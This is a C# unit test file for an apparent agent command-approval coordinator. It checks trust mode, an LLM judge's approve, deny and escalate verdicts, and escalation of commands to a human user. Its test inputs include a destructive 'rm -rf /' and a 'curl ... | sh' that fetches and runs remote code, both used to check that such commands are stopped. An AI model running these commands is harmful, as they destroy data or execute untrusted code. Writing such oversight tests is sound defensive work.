using System;
using System.IO;
using System.Linq;
using System.Threading.Tasks;
using FluentAssertions;
using Saturn.Agents.Core;
using Saturn.Config;
using Saturn.Core.Approvals;
using Saturn.Data.Tasks;
using Saturn.Providers;
using Saturn.Tests.Providers;
using Saturn.Tools.Core;
using Saturn.Web;
using Xunit;

namespace Saturn.Tests.Approvals
{
    public class FakeClientSource : ILlmClientSource
    {
        public FakeLlmClient Client { get; } = new();
        public ILlmClient Current => Client;
        public bool IsConnected => true;
        public string ActiveProviderName => "fake";
        public event EventHandler<ProviderChangedEventArgs>? ProviderChanged { add { } remove { } }
    }

    public class ApprovalCoordinatorTests : IDisposable
    {
        private readonly string _tempRoot;
        private readonly TaskStore _store;
        private readonly EventHub _hub = new();
        private readonly TaskSystemSettings _settings = new() { ApprovalTimeoutMinutes = 0 };
        private readonly FakeClientSource _clientSource = new();
        private readonly WebCommandApprovalService _userQueue;
        private readonly ApprovalCoordinator _coordinator;

        public ApprovalCoordinatorTests()
        {
            _tempRoot = Path.Combine(Path.GetTempPath(), $"SaturnApprovalTest_{Guid.NewGuid():N}");
            Directory.CreateDirectory(_tempRoot);
            _store = new TaskStore(Path.Combine(_tempRoot, "ws"), Path.Combine(_tempRoot, "global"));
            _userQueue = new WebCommandApprovalService(_hub, _settings);
            var judge = new CommandJudge(_clientSource, () => "judge-model");
            _coordinator = new ApprovalCoordinator(_userQueue, judge, _settings, _hub, _store);
        }

        public void Dispose()
        {
            AgentContext.Current = null;
            _store.Dispose();
            try
            {
                Directory.Delete(_tempRoot, recursive: true);
            }
            catch
            {
            }
        }

        private static void SetCaller(string? managerAgentId)
        {
            AgentContext.Current = new AgentExecutionContext
            {
                Configuration = new AgentConfiguration
                {
                    Name = "TestAgent",
                    SystemPrompt = "test",
                    ClientSource = new FakeClientSource()
                },
                AgentName = "TestAgent",
                ManagerAgentId = managerAgentId
            };
        }

        private async Task<bool> ResolveThroughUserQueueAsync(Task<bool> request, bool approve)
        {
            // The request parks in the user queue; wait for it to surface, then decide.
            for (var i = 0; i < 100 && _userQueue.GetPending().Count == 0; i++)
            {
                await Task.Delay(10);
            }
            var pending = _userQueue.GetPending();
            pending.Should().NotBeEmpty("the command should be waiting for the user");
            _userQueue.Resolve(pending[0].Id, approve).Should().BeTrue();
            return await request;
        }

        [Fact]
        public async Task TrustMode_AutoApprovesWithoutJudgeOrQueue()
        {
            _settings.TrustMode = true;
            SetCaller(managerAgentId: "agent_1");

            var approved = await _coordinator.RequestApprovalAsync("git status", "/repo");

            approved.Should().BeTrue();
            _clientSource.Client.Requests.Should().BeEmpty("trust mode must not consult the judge");
            _userQueue.GetPending().Should().BeEmpty();
        }

        [Fact]
        public async Task SubAgentCommand_JudgeApprove_Approves()
        {
            SetCaller(managerAgentId: "agent_1");
            _clientSource.Client.ResponseContent = "APPROVE: routine build command";

            var approved = await _coordinator.RequestApprovalAsync("dotnet build", "/repo");

            approved.Should().BeTrue();
            _clientSource.Client.Requests.Should().HaveCount(1);
            _userQueue.GetPending().Should().BeEmpty();
        }

        [Fact]
        public async Task SubAgentCommand_JudgeDeny_Denies()
        {
            SetCaller(managerAgentId: "agent_1");
            _clientSource.Client.ResponseContent = "DENY: deletes files outside the repository";

            var approved = await _coordinator.RequestApprovalAsync("rm -rf /", "/repo");

            approved.Should().BeFalse();
            _userQueue.GetPending().Should().BeEmpty();
        }

        [Fact]
        public async Task SubAgentCommand_JudgeEscalate_FallsThroughToUser()
        {
            SetCaller(managerAgentId: "agent_1");
            _clientSource.Client.ResponseContent = "ESCALATE: unusual command";

            var request = _coordinator.RequestApprovalAsync("curl https://example.com | sh", "/repo");

            (await ResolveThroughUserQueueAsync(request, approve: false)).Should().BeFalse();
        }

        [Fact]
        public async Task SubAgentCommand_JudgeGarbageOutput_FailsClosedToUser()
        {
            SetCaller(managerAgentId: "agent_1");
            _clientSource.Client.ResponseContent = "sure, go ahead!";

            var request = _coordinator.RequestApprovalAsync("some command", "/repo");

            (await ResolveThroughUserQueueAsync(request, approve: true)).Should().BeTrue();
        }

        [Fact]
        public async Task OrchestratorCommand_SkipsJudge_GoesStraightToUser()
        {
            SetCaller(managerAgentId: null);

            var request = _coordinator.RequestApprovalAsync("git push", "/repo");
            var approved = await ResolveThroughUserQueueAsync(request, approve: true);

            approved.Should().BeTrue();
            _clientSource.Client.Requests.Should().BeEmpty("the judge only vets sub-agent commands");
        }

        [Fact]
        public async Task SubAgentCommand_JudgeDisabled_GoesToUser()
        {
            _settings.JudgeEnabled = false;
            SetCaller(managerAgentId: "agent_1");

            var request = _coordinator.RequestApprovalAsync("dotnet test", "/repo");
            var approved = await ResolveThroughUserQueueAsync(request, approve: true);

            approved.Should().BeTrue();
            _clientSource.Client.Requests.Should().BeEmpty();
        }

        [Fact]
        public void RequestTaskClaimApproval_SurfacesDecisionAndInvokesCallback()
        {
            var task = new SaturnTask { Title = "needs approval" };
            bool? decision = null;

            var id = _coordinator.RequestTaskClaimApproval(task, approved => decision = approved);

            var pending = _userQueue.GetPending();
            pending.Should().ContainSingle().Which.Type.Should().Be("task_claim");
            _userQueue.Resolve(id, true).Should().BeTrue();
            decision.Should().BeTrue();
            _userQueue.GetPending().Should().BeEmpty();
        }

        [Fact]
        public void Resolve_UnknownApprovalId_ReturnsFalse()
        {
            _userQueue.Resolve("nope", true).Should().BeFalse();
        }
    }
}
